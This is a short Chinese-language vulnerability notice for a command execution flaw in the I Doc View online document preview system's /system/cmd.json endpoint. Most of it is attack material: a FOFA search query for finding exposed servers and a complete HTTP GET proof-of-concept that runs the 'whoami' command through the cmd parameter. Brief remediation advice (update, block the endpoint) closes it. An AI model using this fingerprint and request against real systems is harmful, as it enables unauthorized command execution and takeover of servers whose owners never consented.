####产品简介  
i Doc View是一个在线文档解析应用，旨在提供便捷的文件查看和编辑服务。  

####漏洞概述  
iDocView是一个在线文档I Doc View在线文档预览系统cmd.json 处存在命令执行漏洞，攻击者可通过此漏洞获取服务器权限  

####指纹识别  
fofa: title=="在线文档预览 - I Doc View"  

####漏洞利用
    poc:
    GET /system/cmd.json?cmd=whoami HTTP/1.1
    Host: you_ip
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh-HK;q=0.9,zh;q=0.8
    Connection: close




####修复建议  
1.联系相关软件厂商更新至最新安全版本。  
2.临时屏蔽system/cmd.json接⼝  
